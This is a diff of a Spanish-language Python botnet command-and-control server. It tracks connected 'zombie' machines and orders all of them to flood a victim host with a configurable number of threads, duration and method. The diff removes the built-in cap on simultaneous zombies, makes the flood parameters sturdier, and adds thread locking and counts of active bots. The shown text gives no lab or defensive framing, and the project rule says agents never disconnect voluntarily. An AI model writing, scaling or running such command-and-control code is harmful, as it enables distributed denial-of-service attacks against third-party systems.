@@ -7,18 +7,20 @@ Arquitectura
 ------------
 - TCP puro, protocolo JSON de una línea por mensaje ('\\n').
 - Hilo dedicado por conexión entrante (threading), aceptación en hilo aparte.
+- Sin límite de zombies en el código: entra todo lo que llegue. El techo real
+  son los descriptores de archivo y la memoria de pila del sistema operativo.
 - Sesiones deduplicadas por client_id: una reconexión del mismo equipo
   reemplaza (REEMPLAZADO) a la anterior en lugar de duplicarla.
 - Heartbeat esperado cada 20 s por el agente; sin heartbeat en
   HEARTBEAT_TIMEOUT segundos -> sesión cerrada por TIMEOUT.
-- Tope duro de MAX_ZOMBIES conexiones activas simultáneas (18).
 - Eventos en logs/ (texto + JSONL), métricas por sesión y por objetivo en metrics/.
 - Menú de administración en la consola del servidor.
 
 Regla del proyecto: el agente NO se desconecta voluntariamente. Solo sale
 por caída de red, apagado del equipo, TIMEOUT o kick del administrador.
 
-Puerto de escucha: 4024 (config/.env)
+Configuración: config/.env (única fuente, obligatoria).
+Puerto de escucha por defecto: 4024.
 """
 
 from __future__ import annotations
@@ -26,7 +28,6 @@ from __future__ import annotations
 import csv
 import json
 import logging
-import os
 import signal
 import socket
 import sys
@@ -37,19 +38,19 @@ from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
 from pathlib import Path
-from typing import Dict, List, Optional
+from typing import Dict, Optional
 
 BASE_DIR = Path(__file__).resolve().parent
 CONFIG_FILE = BASE_DIR / "config" / ".env"
 
 CLAVES_OBLIGATORIAS = (
-    "BOT_HOST", "BOT_PORT", "BACKLOG", "MAX_ZOMBIES",
+    "BOT_HOST", "BOT_PORT", "BACKLOG",
     "HANDSHAKE_TIMEOUT", "HEARTBEAT_TIMEOUT", "SOCKET_TIMEOUT",
     "MONITOR_INTERVAL", "LOG_DIR", "METRICS_DIR",
     "VICTIM_HOST", "VICTIM_PORT", "FLOOD_THREADS", "FLOOD_DURATION", "FLOOD_METHOD",
 )
 CLAVES_ENTERAS = (
-    "BOT_PORT", "BACKLOG", "MAX_ZOMBIES", "HANDSHAKE_TIMEOUT",
+    "BOT_PORT", "BACKLOG", "HANDSHAKE_TIMEOUT",
     "HEARTBEAT_TIMEOUT", "SOCKET_TIMEOUT", "MONITOR_INTERVAL",
     "VICTIM_PORT", "FLOOD_THREADS", "FLOOD_DURATION",
 )
@@ -144,7 +145,6 @@ class Estado(str, Enum):
     TIMEOUT = "TIMEOUT"                 # sin heartbeat a tiempo
     REEMPLAZADO = "REEMPLAZADO"         # sustituida por una reconexión
     EXPULSADO = "EXPULSADO"             # kick del administrador
-    RECHAZADO = "RECHAZADO"             # tope de zombies alcanzado
 
 
 @dataclass
@@ -183,7 +183,6 @@ class ServidorBotnet:
         self.host = cfg["BOT_HOST"]
         self.puerto = cfg["BOT_PORT"]
         self.backlog = cfg["BACKLOG"]
-        self.max_zombies = cfg["MAX_ZOMBIES"]
         self.handshake_timeout = cfg["HANDSHAKE_TIMEOUT"]
         self.heartbeat_timeout = cfg["HEARTBEAT_TIMEOUT"]
         self.socket_timeout = cfg["SOCKET_TIMEOUT"]
@@ -212,14 +211,13 @@ class ServidorBotnet:
         self.sock_servidor.settimeout(1.0)
         self.corriendo = True
 
-        self.reg.evento("SERVIDOR_INICIADO", host=self.host, puerto=self.puerto,
-                        max_zombies=self.max_zombies)
+        self.reg.evento("SERVIDOR_INICIADO", host=self.host, puerto=self.puerto)
         logging.info("Servidor iniciado en %s:%s", self.host, self.puerto)
 
         print("=" * 62)
         print("  SERVIDOR BOTNET — escuchando en {}:{}".format(self.host, self.puerto))
-        print("  Zombies máximos: {} | heartbeat timeout: {}s".format(
-            self.max_zombies, self.heartbeat_timeout))
+        print("  Sin límite de zombies | heartbeat timeout: {}s".format(
+            self.heartbeat_timeout))
         print("  Logs: {} | Métricas: {}".format(self.reg.log_dir, self.reg.metrics_dir))
         print("=" * 62)
 
@@ -287,12 +285,6 @@ class ServidorBotnet:
                 self._cerrar_locked(
                     existente, Estado.REEMPLAZADO,
                     "sustituida por nueva conexión desde {}:{}".format(ip, puerto))
-            elif not existente and self._activas_locked() >= self.max_zombies:
-                self._cerrar_socket(conn)
-                self.reg.evento("RECHAZADO_TOPE", client_id=client_id, hostname=hostname,
-                                ip=ip, tope=self.max_zombies)
-                logging.warning("Rechazado %s: tope de %s zombies", client_id, self.max_zombies)
-                return
 
             sesion = Sesion(
                 client_id=client_id, hostname=hostname, os_info=os_info,
@@ -301,11 +293,13 @@ class ServidorBotnet:
                 reconexiones=reconexiones,
             )
             self.sesiones[client_id] = sesion
+            activas = self._activas_locked()
 
         self.reg.evento("CONECTADO", client_id=client_id, hostname=hostname,
                         os=os_info, ip=ip, puerto=puerto, reconexiones=reconexiones)
         logging.info("CONECTADO %s host=%s ip=%s:%s", client_id, hostname, ip, puerto)
-        print("\n[+] Nuevo zombie: {} ({}) desde {}:{}".format(hostname, client_id, ip, puerto))
+        print("\n[+] Nuevo zombie: {} ({}) desde {}:{} | activos: {}".format(
+            hostname, client_id, ip, puerto, activas))
         print("admin> ", end="", flush=True)
 
         self._enviar(sesion, {
@@ -501,8 +495,11 @@ class ServidorBotnet:
 """)
             try:
                 opcion = input("admin> ").strip()
-            except (EOFError, KeyboardInterrupt):
+            except KeyboardInterrupt:
                 opcion = "11"
+            except EOFError:
+                time.sleep(0.5)
+                continue
             if not opcion:
                 continue
             self.reg.accion("MENU {}".format(opcion))
@@ -547,31 +544,41 @@ class ServidorBotnet:
                     s.client_id, s.hostname[:17], s.ip, s.estado.value,
                     s.conectado_en.strftime("%d/%m %H:%M:%S"), s.acks_recibidos,
                     "SÍ " + s.flood_objetivo if s.inundando else "no"))
+            print("-" * len(cab))
+            print("Activos: {} | en tabla: {}".format(
+                self._activas_locked(), len(self.sesiones)))
 
     def _detalle(self):
         cid = input("client_id: ").strip()
-        sesion = self.sesiones.get(cid)
-        if not sesion:
-            print("No existe esa sesión.")
-            return
-        print("client_id.......: {}".format(sesion.client_id))
-        print("hostname........: {}".format(sesion.hostname))
-        print("sistema.........: {}".format(sesion.os_info))
-        print("origen..........: {}:{}".format(sesion.ip, sesion.puerto))
-        print("estado..........: {}".format(sesion.estado.value))
-        print("conectado en....: {}".format(sesion.conectado_en.strftime("%Y-%m-%d %H:%M:%S")))
-        print("desconectado en.: {}".format(
-            sesion.desconectado_en.strftime("%Y-%m-%d %H:%M:%S") if sesion.desconectado_en else "-"))
-        print("duración........: {:.0f}s".format(sesion.duracion()))
-        print("último heartbeat: {}".format(sesion.ultimo_heartbeat.strftime("%H:%M:%S")))
-        print("comandos/acks...: {}/{}".format(sesion.comandos_enviados, sesion.acks_recibidos))
-        print("reconexiones....: {}".format(sesion.reconexiones))
-        print("motivo cierre...: {}".format(sesion.motivo or "-"))
+        with self.lock:
+            sesion = self.sesiones.get(cid)
+            if not sesion:
+                print("No existe esa sesión.")
+                return
+            datos = [
+                ("client_id", sesion.client_id),
+                ("hostname", sesion.hostname),
+                ("sistema", sesion.os_info),
+                ("origen", "{}:{}".format(sesion.ip, sesion.puerto)),
+                ("estado", sesion.estado.value),
+                ("conectado en", sesion.conectado_en.strftime("%Y-%m-%d %H:%M:%S")),
+                ("desconectado en", sesion.desconectado_en.strftime("%Y-%m-%d %H:%M:%S")
+                 if sesion.desconectado_en else "-"),
+                ("duración", "{:.0f}s".format(sesion.duracion())),
+                ("último heartbeat", sesion.ultimo_heartbeat.strftime("%H:%M:%S")),
+                ("comandos/acks", "{}/{}".format(sesion.comandos_enviados,
+                                                 sesion.acks_recibidos)),
+                ("reconexiones", sesion.reconexiones),
+                ("motivo cierre", sesion.motivo or "-"),
+            ]
+        for etiqueta, valor in datos:
+            print("{:<18}: {}".format(etiqueta, valor))
 
     def _comando_uno(self):
         cid = input("client_id: ").strip()
         cmd = input("comando (PING/INFO/FLOOD/STOP): ").strip().upper()
-        sesion = self.sesiones.get(cid)
+        with self.lock:
+            sesion = self.sesiones.get(cid)
         if not sesion or sesion.estado != Estado.CONECTADO:
             print("Sesión no activa.")
             return
@@ -593,12 +600,24 @@ class ServidorBotnet:
         return {}
 
     def _flood(self):
+        def pedir(texto, defecto, minimo, maximo):
+            while True:
+                crudo = input("{} [{}]: ".format(texto, defecto)).strip() or str(defecto)
+                try:
+                    valor = int(crudo)
+                except ValueError:
+                    print("  Debe ser un número.")
+                    continue
+                if minimo <= valor <= maximo:
+                    return valor
+                print("  Fuera de rango ({}-{}).".format(minimo, maximo))
+
         host = input("objetivo [{}]: ".format(self.victim_host)).strip() or self.victim_host
-        puerto = input("puerto [{}]: ".format(self.victim_port)).strip() or str(self.victim_port)
-        hilos = input("hilos [{}]: ".format(self.flood_threads)).strip() or str(self.flood_threads)
-        dur = input("duración s [{}]: ".format(self.flood_duration)).strip() or str(self.flood_duration)
-        payload = {"host": host, "port": int(puerto), "threads": int(hilos),
-                   "duration": int(dur), "method": self.flood_method}
+        puerto = pedir("puerto", self.victim_port, 1, 65535)
+        hilos = pedir("hilos", self.flood_threads, 1, 500)
+        dur = pedir("duración s", self.flood_duration, 1, 3600)
+        payload = {"host": host, "port": puerto, "threads": hilos,
+                   "duration": dur, "method": self.flood_method}
 
         with self.lock:
             activas = [s for s in self.sesiones.values() if s.estado == Estado.CONECTADO]
@@ -654,10 +673,15 @@ class ServidorBotnet:
         cid = input("client_id (vacío = resumen): ").strip()
         if not cid:
             with self.lock:
-                for s in self.sesiones.values():
-                    print("{:<14}{:<18} acks={:<4} comandos={:<4} reconex={}".format(
-                        s.client_id, s.hostname, s.acks_recibidos,
-                        s.comandos_enviados, s.reconexiones))
+                resumen = [(s.client_id, s.hostname, s.acks_recibidos,
+                            s.comandos_enviados, s.reconexiones)
+                           for s in self.sesiones.values()]
+            if not resumen:
+                print("(sin sesiones)")
+                return
+            for cid_s, host, acks, comandos, reconex in resumen:
+                print("{:<14}{:<18} acks={:<4} comandos={:<4} reconex={}".format(
+                    cid_s, host, acks, comandos, reconex))
             return
         ruta = Path(self.reg.metrics_dir) / "{}.jsonl".format(cid)
         if not ruta.exists():
